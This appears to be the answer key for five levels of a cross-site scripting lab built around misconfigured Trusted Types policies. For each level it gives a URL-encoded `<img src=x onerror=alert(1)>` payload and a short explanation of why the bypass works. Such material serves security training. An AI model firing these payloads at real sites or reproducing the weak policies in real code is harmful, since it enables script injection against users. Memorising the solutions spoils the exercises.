# trustedtypes — solutions

Trusted Types misconfigurations (report-only, permissive default policy, partial sanitization).

### trustedtypes-level1

`/trustedtypes/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: TT is report-only — innerHTML still executes

### trustedtypes-level2

`/trustedtypes/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: default policy returns input unchanged — pass-through TT bypass

### trustedtypes-level3

`/trustedtypes/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: loose policy wraps in `<span>` but does not sanitize

### trustedtypes-level4

`/trustedtypes/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: no TT header set — innerHTML works directly

### trustedtypes-level5

`/trustedtypes/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: policy strips only `<script>...</script>` — img onerror passes
